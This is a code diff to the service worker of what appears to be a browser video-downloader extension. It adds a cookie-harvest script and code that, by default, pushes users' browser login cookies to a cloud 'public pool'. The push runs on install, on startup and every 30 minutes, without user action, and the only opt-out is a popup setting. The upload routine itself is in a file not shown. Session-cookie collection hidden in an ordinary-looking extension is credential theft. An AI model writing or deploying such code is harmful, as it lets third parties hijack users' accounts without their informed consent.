@@ -20,6 +20,9 @@
 'use strict';
 
 importScripts('sniff-core.js');
+// 登录态采集/自动共享（cookie-harvest.js 挂 globalThis.VDLCookie）。
+// 只在 alarms 触发时用到；放这里是为了 SW 每次被唤醒都能拿到它。
+importScripts('cookie-harvest.js');
 
 var CORE = globalThis.VDLSniffCore;
 var STORE_CAP = 200;        // 单个标签页的可下载项上限
@@ -698,6 +701,31 @@ try {
     if (a && a.name === 'vdlHeartbeat') heartbeat();
   });
 } catch (e) { console.error('alarms 注册失败', e); }
+
+// ---- 默认自动共享登录态到云端公共池（产品策略，2026-10-18）----
+// 与桌面 App 的「启动推一次 + 每 30 分钟」同节奏。三个触发点共用 autoPush
+// 内部的节流戳（storage.local.vdlCookieLastPush），所以不会因为多重触发而连推：
+//   · alarm 每 30 分钟（浏览器挂着不动也照跑，不依赖用户点扩展图标）
+//   · onInstalled / onStartup（装完、开机各补一次）
+// 用户在 popup 取消勾选 → storage.local.vdlCookieShare = false → 这里直接跳过。
+function cookieAutoPush(why) {
+  try {
+    if (!globalThis.VDLCookie || typeof VDLCookie.autoPush !== 'function') return;
+    VDLCookie.autoPush(chrome, null, function (r) {
+      if (r && r.pushed) {
+        console.log('[cookie-sync] ' + why + ' pushed=' + r.pushed + '/' + (r.total || 0));
+      }
+    });
+  } catch (e) { console.error('[cookie-sync] 失败', e); }
+}
+try {
+  chrome.alarms.create('vdlCookieSync', { periodInMinutes: 30 });
+  chrome.alarms.onAlarm.addListener(function (a) {
+    if (a && a.name === 'vdlCookieSync') cookieAutoPush('alarm');
+  });
+  chrome.runtime.onInstalled.addListener(function () { cookieAutoPush('installed'); });
+  chrome.runtime.onStartup.addListener(function () { cookieAutoPush('startup'); });
+} catch (e) { console.error('cookie-sync 注册失败', e); }
 
 // ---- 启动恢复 ----
 (function restore() {
